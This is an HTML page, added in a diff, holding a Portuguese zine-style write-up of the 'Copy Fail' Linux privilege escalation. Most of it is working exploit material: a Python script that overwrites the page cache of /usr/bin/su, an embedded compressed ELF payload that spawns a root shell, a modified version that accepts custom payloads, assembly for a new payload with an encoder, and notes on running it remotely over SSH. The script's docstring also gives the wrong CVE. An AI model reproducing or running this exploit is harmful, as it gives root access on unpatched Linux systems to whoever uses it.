@@ -1,0 +1,427 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>LINKS - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+        ____   __  __                _            _______ _     _       _    
+       / __ \ / _|/ _|              (_)          |__   __| |   (_)     | |   
+      | |  | | |_| |_ ___ _ __  ___  ___   _____    | |  | |__  _ _ __ | | __
+      | |  | |  _|  _/ _ \ '_ \/ __| | \ \ / / _ \   | |  | '_ \| | '_ \| |/ /
+      | |__| | | | ||  __/ | | \__ \ | |\ V /  __/   | |  | | | | | | | |   &lt; 
+       \____/|_| |_| \___|_| |_|___/_|_| \_/ \___|   |_|  |_| |_|_|_| |_|_|\_\
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : LINKS
+        autor  : offensive think
+        data   : 2026-05-12
+        tags   : -
+
+        ----------------------------------------------------------------
+
+        --&gt; https://www.offensivethink.com/posts/copy-fail.html &lt;--
+
+---[ INDEX ]------------------------------------------------------------
+
+0 - REFERENCIAS
+1 - O QUE APRENDEMOS, TL;DR;
+2 - ALGUNS COMANDOS E TIPS INTERESSANTES
+3 - SCRIPT POC EXPLOIT
+4 - PAYLOAD
+5 - EXECUTANDO REMOTO
+6 - RESTAURANDO O COMPORTAMENTO DO SU
+
+
+---[ REFERENCIAS ]------------------------------------------------------------
+
+
+https://www.reddit.com/r/sysadmin/comments/1szajkx/copy_fail_cve202631431_is_a_trivially_exploitable/
+https://copy.fail/
+https://xint.io/blog/copy-fail-linux-distributions
+
+
+---[ O QUE APRENDEMOS, TL;DR; ]-----------------------------------------
+
+Que todo binário no linux ao ser executado pela primeira vez , é levado para a memória para execuções diretas sem passar pela carga de disco,  por motivos de otimização. Esse binário é escrito em Page Caches! 
+
+Todo *arquivo acessado recentemente* fica: binários, bibliotecas .so, arquivos de configuração, arquivos de dados. O kernel usa a RAM livre para isso automaticamente. Quando a RAM enche, ele descarta as páginas menos usadas (LRU).
+
+Normalmente, ao menos para binários ou para arquivos que vc não tem permissão de escrita, essas páginas de memória são apenas para Leitura. Arquivos que você tem permissão de escrita, como por exemplo documentos, são marcadas como DIRTY (modificada) quando você faz alguma alteração para que após um tempo ela seja escrita em disco refletindo permanentemente a alteração.
+
+Esse script usa o Diry Pipe, que é um bug onde usando o splice() em conjunto com pipes, o atacante consegue bypassar essa verificação de permissão de escrita e escrever na página.
+
+Existe uma forma de descartar as páginas marcadas como DIRTY sem que elas sejam persistidas em disco, usando: sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches
+
+    $ sync → Força que as páginas marcadas como Dirty sejam escritas em disco, mas as páginas permanecem! 
+    $ echo 3 &gt; /proc/sys/vm/drop_caches → Força que as páginas sejam descartadas! 
+
+*Atenção!* Apesar de escrever na memória o que foi modificado não vai ser persistido em disco pois o Kernel faz controle de permissão de writeback, ou seja, antes de escrever o que foi alterado na página marcada como DIRTY ele checa se o usuário tem permissão sobre esse arquivo e operação.
+
+Logo o sync vai resguardar que toda alteração nas Page Caches sejam escritas em disco, mas não vai escrever o que foi alterado na page cache do su pois o usuário não tem permissão. Nesse ponto, tudo tá persistido em disco, mas a página do su ainda continua com o código do payload. Em seguida a sobrescrita do drop_caches força o kernel a descartar todas as páginas, descartando então o payload e forçando o su a ser carregado do disco novamente!
+
+
+---[ ALGUNS COMANDOS E TIPS INTERESSANTES ]-----------------------------
+
+    $ ndisasm -b 64 -o 0x400000 payload.bin → Disassembla colocando os endereços das instruções como base em 0x400000
+
+    $ dd if=payload.bin bs=1 skip=120 | ndisasm -b 64 - → Disassemblar apenas uma parte de um payload começando 120 bytes a frente
+
+    $ r2 -b 64 payload.bin &gt; e asm.syntax=intel &gt; pd 20 @ 0x400078 → Disassemblar via Radare 20 bytes a partir de um Offset (Entry point)
+
+:: SHELCODE TIP
+   
+    xor rdx,rdx → 3 bytes ( 0x4831D2 )  = Zera RDX
+    cdq         → 1 byte  (0x99)        = Zera RDX se EAX for positivo ( bit 31 = 0 )
+
+---[ POC EXPLOIT ]-----------------------------------------------
+
+:: SCRIPT ORIGINAL
+
+    #!/usr/bin/env python3
+    import os as g,zlib,socket as s
+    def d(x):return bytes.fromhex(x)
+    def c(f,t,c):
+     a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+     try:u.recv(8+t)
+     except:0
+    f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+    while i&lt;len(e):c(f,i,e[i:i+4]);i+=4
+    g.system("su")
+
+:: MELHORIAS 
+
+Primeiro, pedi para a IA identar e documentar o script para melhor leitura
+
+O script não tratava de fechar os sockets abertos e com isso, se o payload fosse maior, os file descriptors eram exauridos retornando o erro Too Many Open Files.
+
+    Traceback (most recent call last):
+      File "/home/user/Projects/scanner/copy-fail.py", line 9, in &lt;module&gt;
+      File "/home/user/Projects/scanner/copy-fail.py", line 5, in c
+    OSError: [Errno 24] Too many open files
+
+Para isso, fechamos os sockets adicionando um  finally  ao try except. 
+
+Colocamos a opção de receber o payload a ser executado diretamente na linha de comando.
+
+    #!/usr/bin/env python3
+    """
+    CVE-2022-0847
+    Classificação: LPE (Local Privilege Escalation)
+    Payload: ELF mínimo → setuid(0) + execve("/bin/sh") OR OTHER
+    Modified by IA + Diego Albuquerque (joaninhaDark) ;D
+    """
+    import os
+    import zlib
+    import socket
+    import sys #added by Diego Albuquerque
+    
+    
+    def hex_to_bytes(hex_string):
+        return bytes.fromhex(hex_string)
+    
+    
+    def patch_page_cache(target_fd, offset, patch_bytes):
+        # Cria socket AF_ALG (kernel crypto API) para operações AEAD
+        alg_socket = socket.socket(38, 5, 0)
+        alg_socket.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+    
+        SOL_ALG = 279  # nível de opção para sockets AF_ALG
+        set_opt = alg_socket.setsockopt
+    
+        # Configura chave de criptografia (usada apenas como veículo do exploit)
+        set_opt(SOL_ALG, 1, hex_to_bytes("0800010000000010" + "0" * 64))
+        set_opt(SOL_ALG, 5, None, 4)
+    
+        conn_socket, _ = alg_socket.accept()
+        write_size = offset + 4
+        zero_byte = hex_to_bytes("00")
+    
+        # Envia mensagem com ancillary data para configurar operação crypto
+        conn_socket.sendmsg(
+            [b"A" * 4 + patch_bytes],
+            [
+                (SOL_ALG, 3, zero_byte * 4),        # IV
+                (SOL_ALG, 2, b"\x10" + zero_byte * 19),  # chave
+                (SOL_ALG, 4, b"\x08" + zero_byte * 3),   # op type
+            ],
+            32768,
+        )
+    
+        # Dirty Pipe: splice do fd do arquivo para o pipe sem verificação de permissão
+        pipe_read, pipe_write = os.pipe()
+        splice = os.splice
+        splice(target_fd, pipe_write, write_size, offset_src=0)  # lê do binário para o pipe
+        splice(pipe_read, conn_socket.fileno(), write_size)       # escreve no page cache via AF_ALG
+    
+        try:
+            conn_socket.recv(8 + offset)
+        except:
+            pass
+        finally:
+            os.close(pipe_read) # added by Diego Albuquerque
+            os.close(pipe_write) # Added by Diego Albuquerque
+            alg_socket.close() # Added by Diego Albuquerque
+        
+    # Abre /usr/bin/su somente leitura (permissão de escrita não é necessária — esse é o bug)
+    target_binary_fd = os.open("/usr/bin/su", 0)
+    
+    # Payload: ELF mínimo contendo setuid(0) + execve("/bin/sh") + exit(0)
+    # Técnica de evasão: bytes binários → zlib compress → hex encode
+    elf_2_payload = sys.argv[1] if len(sys.argv) &gt; 1 else "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3" # Added by Diego Albuquerque
+    
+    elf_payload = zlib.decompress(
+        hex_to_bytes(elf_2_payload) # Modified by Diego Albuquerque
+        )
+    )
+    
+    # Aplica o patch de 4 bytes por vez no page cache do binário
+    current_offset = 0
+    while current_offset &lt; len(elf_payload):
+        patch_page_cache(target_binary_fd, current_offset, elf_payload[current_offset:current_offset + 4])
+        current_offset += 4
+    
+    # Executa o su já comprometido em memória
+    os.system("su")
+
+
+
+---[ SOBRE PAYLOAD ]----------------------------------------------------------
+
+:: ORIGINAL
+
+O Payload é um ELF completo feito em ASM que faz apenas setuid(0) + execve (/bin/sh)  + exit(0), com isso, ele substitui “todo o binário su”  no page cache do kernel por essa versão que apenas executa o /bin/sh como root! 
+
+O Payload está compactado (zlilb) e em hex e pode ser re-gerado/demonstado com o script abaixo:
+
+    import zlib
+    
+    data = zlib.decompress(bytes.fromhex("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+    
+    with open("./payload.bin", "wb") as f:
+        f.write(data)
+
+
+Ao analisar o payload.bin gerado iremos observar que se trata de um ELF sem seções e estaticamente linkado.
+
+</pre>
+<a href="../images/links/Pasted image 20260505064542.png" target="_blank"><img src="../images/links/Pasted image 20260505064542.png" alt="Pasted image 20260505064542"></a>
+<pre>
+
+Podemos observar o seu conteúdo através do ndisasm:
+
+    $ ndisasm -b64 -o 0x400000 payload.bin
+
+</pre>
+<a href="../images/links/Pasted image 20260505081612.png" target="_blank"><img src="../images/links/Pasted image 20260505081612.png" alt="Pasted image 20260505081612"></a>
+<pre>
+
+Como o ndisasm vai tentar interpretar tudo como código ASM, várias instruções iniciais aparecerão sem sentido, pois na verdade, elas fazem parte do cabeçalho ELF que começa com : 7F 45 4C 46 → 7F + ELF 
+
+Como ele interpreta tudo como instrução ASM, inclusive o que é o cabeçalho ELF, e como é um plataforma CISC onde o tamanho das instruções são variáveis, podemos obter algumas “instruções estranhas” ou “disassembladas” de forma “errada”
+
+O código mesmo está a partir de:
+
+    xor edi, edi          ; edi = 0
+    mov al, 0x69          ; syscall 0x69 = 105 = setuid(0) → força uid root
+    syscall
+    
+    lea rdi, [rel 0x96]   ; rdi aponta para string "/bin/sh"
+    xor esi, esi          ; argv = NULL
+    push 0x3b             ; syscall 59 = execve
+    pop rax
+    cdq                   ; edx = NULL (envp)
+    syscall               ; execve("/bin/sh", NULL, NULL)
+    
+    xor edi, edi
+    push 0x3c             ; syscall 60 = exit
+    pop rax
+    syscall
+
+Podemos observar melhor:
+
+</pre>
+<a href="../images/links/Pasted image 20260505080439.png" target="_blank"><img src="../images/links/Pasted image 20260505080439.png" alt="Pasted image 20260505080439"></a>
+<pre>
+
+Do disassembly acima notamos que fica difícil saber que instrução realmente está no entry point 0x400078:
+
+</pre>
+<a href="../images/links/Pasted image 20260505081919.png" target="_blank"><img src="../images/links/Pasted image 20260505081919.png" alt="Pasted image 20260505081919"></a>
+<pre>
+
+Executando a cópia via dd do payload , pulando exatamente 120 bytes (0x78) ,  para chegar no entry point, e passando o resultado para o ndisasm, temos:  dd if=payload.bin bs=1 skip=120 | ndisasm -b 64 -
+
+</pre>
+<a href="../images/links/Pasted image 20260505082201.png" target="_blank"><img src="../images/links/Pasted image 20260505082201.png" alt="Pasted image 20260505082201"></a>
+<pre>
+
+via radare
+
+</pre>
+<a href="../images/links/Pasted image 20260505082247.png" target="_blank"><img src="../images/links/Pasted image 20260505082247.png" alt="Pasted image 20260505082247"></a>
+<pre>
+
+
+:: UM NOVO PAYLOAD
+
+Pode-se criar um novo payload gerando um EFL totalmente “capado” de headers, seções, etc. diretamente em ASM. 
+
+A ideia abaixo foi criar um payload que simplesmente crie um arquivo em /tmp com usuário root como dono, assim, um payload inócuo mas que mostre que a vulnerabilidade é efetiva. 
+
+O payload “deve” ser gerado em ASM para evitar toda sobrecarga que os compiladores e linkadores adicionam ao binário final. 
+
+
+    BITS 64
+        global _start
+    
+    _start:
+    ; ┌─────────────────────────────────────────────┐
+    ; │  int setuid(uid_t uid);                     │
+    ; │  RAX = 105  (syscall = SYS_setuid = 105)    │
+    ; │  RDI = 0    (arg1 = uid = 0                 │
+    ; └─────────────────────────────────────────────┘
+        xor   edi, edi    ; 31 FF          — zera EDI (e RDI via zero-extend)
+        push  105         ; 6A 69          — push SYSCALL ID (105 = 0x69)
+        pop   rax         ; 58             — pop  SYSCALL ID -&gt; rax = 105
+        syscall           ; 0F 05
+    
+    ; ┌─────────────────────────────────────────────────────────────────┐
+    ; │  int open(const char *path, int oflag, mode_t mode);            │
+    ; │  RAX = 2      ( syscall = SYS_open = 02 )                       │
+    ; │  RDI = &amp;path  ( arg1 = path address = [rel label] )         │
+    ; │  RSI = 0x241  ( arg2 = oflag = 0x241)                           │
+    ; │         O_WRONLY = 0x001                                        │
+    ; │         O_CREAT  = 0x040                                        │
+    ; │         O_TRUNC  = 0x200  → 0x241                               │
+    ; │  RDX = 0x1A4  ( arg3 = mode = 644 = 0x1A4 )                     │
+    ; └─────────────────────────────────────────────────────────────────┘
+        lea   rdi, [rel path] ; 48 8D 3D [end path]  — label path relative address:  /tmp/priv-oi
+        mov   esi, 0x241      ; BE 41 02 00 00       — RSI
+        mov   edx, 0o644      ; BA A4 01 00 00       — RDX
+        push  2               ; 6A 02                - RAX SYSCALL
+        pop   rax             ; 58
+        syscall               ; 0F 05
+        push  rax             ; 50                   — Return File Descriptor (fd) 
+    
+    ; ┌──────────────────────────────────────────────────────────────┐
+    ; │  size_t write(int fd, const void *buf, size_t count);        │
+    ; │  RAX = 1     (syscall = SYS_write = 1)                       │
+    ; │  RDI = fd    (arg1 = fd = EAX returned from open() )         │
+    ; │  RSI = &amp;msg  (arg2 = *buf = string to write rel address) │
+    ; │  RDX = 4     (arg3 = lenght string )                         │
+    ; └──────────────────────────────────────────────────────────────┘
+        mov   edi, eax        ; 89 C7             — RDI
+        lea   rsi, [rel msg]  ; 48 8D 35 [rel32]  — string relative address
+        push  4               ; 6A 04             - RDX
+        pop   rdx             ; 5A
+        push  1               ; 6A 01             - RAX SYSCALL
+        pop   rax             ; 58
+        syscall               ; 0F 05
+    
+    ; ┌───────────────────────────────────────────────────┐
+    ; │  int close(int fd);                               │
+    ; │  RAX = 3    (syscall = SYS_close = 3)             │
+    ; │  RDI = fd   (arg 1 = fd = put on stack before     │
+    ; └───────────────────────────────────────────────────┘
+        pop   rdi             ; 5F                — FD from stack
+        push  3               ; 6A 03             - RAX SYSCALL
+        pop   rax             ; 58
+        syscall               ; 0F 05
+    
+    ; ┌────────────────────────────────────────┐
+    ; │  void exit(int status);                │
+    ; │  RAX = 60   (syscall = SYS_exit = 0)   │
+    ; │  RDI = 0    (arg1 = status = 0         │
+    ; └────────────────────────────────────────┘
+        xor   edi, edi        ; 31 FF    - RDI 
+        push  60              ; 6A 3C    — RAX SYSCALL
+        pop   rax             ; 58
+        syscall               ; 0F 05
+    
+    path: db "/tmp/priv-oi", 0   ; 2F 74 6D 70 2F 70 72 69 76 2D 6F 69 00
+    msg:  db "oi!", 10           ; 6F 69 21 0A
+
+
+
+Vamos então montar e linkar o binário, deixando ele em um segmento único totalmente sem simbolos e demais informações que não nos interessa. Vamos enxugar ao máximo
+
+    $ nasm -f elf64 -o payload.o payload.asm
+    $ ld -o payload payload.o
+
+Se executarmos o comando file para ver o tipo de arquivo final, vamos observar que se trata de um binário ELF, como esperado
+
+    $ file payload
+    payload: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
+
+Agora vamos transformar o ELF no que o código do POC espera, *uma sequencia hexa de um binário compactado*. Para isso usaremos o script python abaixo:
+
+       import zlib
+       import sys
+       
+       # Lê o binário compilado
+       arquivo = sys.argv[1]
+       with open(arquivo, "rb") as f:
+           binary_data = f.read()
+       
+       # Comprime e converte para hex
+       compressed = zlib.compress(binary_data)
+       hex_encoded = compressed.hex()
+       
+       print(f"Tamanho original : {len(binary_data)} bytes")
+       print(f"Tamanho comprimido: {len(compressed)} bytes")
+       print(f'Iterações: {len(binary_data)//4} chamadas a c()')
+       
+       print(f"\nHex:\n{hex_encoded}")
+
+
+    $ python convert-to-zlib-hex.py payload-write
+    Tamanho original : 4384 bytes
+    Tamanho comprimido: 206 bytes
+    Iterações: 1096 chamadas a c()
+    
+    Hex:
+    789cab77f57163626464800126063b0608cf018964604810802b018a5900d5383030035583d4b282040510b2c8b42f9407a31990cc1905a360148c8251300a46c1281805a360148c8251300a46017d80e1ffaccc087e568f5e5b3d206f9f231303c3ae25c04e7d16135034a0f3b847afa91250228b252a8b1128129fc50c24819a6c80947e496e817e415166996e7e26437ea62217835e7146714951496212835e496a450915dcc70dc4a0310636b8880384828e23f8a2a9471f5e00e965c662ae2f54a12016f5c800007f0d1f8c
+
+
+Com o payload em Hexa, agora basta executar nosso POC passando o payload como parâmetro.
+
+</pre>
+<a href="../images/links/Pasted image 20260506202529.png" target="_blank"><img src="../images/links/Pasted image 20260506202529.png" alt="Pasted image 20260506202529"></a>
+<pre>
+
+
+---[ EXECUTANDO REMOTO ]------------------------------------------------
+
+Se você tiver um usuário ssh válido em algumas máquinas, é possível executar remotamente. 
+
+</pre>
+<a href="../images/links/Pasted image 20260506203614.png" target="_blank"><img src="../images/links/Pasted image 20260506203614.png" alt="Pasted image 20260506203614"></a>
+<a href="../images/links/Pasted image 20260506203643.png" target="_blank"><img src="../images/links/Pasted image 20260506203643.png" alt="Pasted image 20260506203643"></a>
+<pre>
+
+
+---[ RESTAURANDO O COMPORTAMENTO DO SU ]--------------------------------
+
+Ao sobrescrever as páginas do su na memória , ao tentar executar o su novamente, será executado o payload colocado. Para restaurar o comportamento original, onde será solicitada senha do usuário, deve-se fazer:
+
+$ sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches
+
+
+---[ EOF ]--------------------------------------------------------------
+
+offensive think / 2026
+
+------------------------------------------------------------------------
+
+</pre>
+</main>
+</body>
+</html>
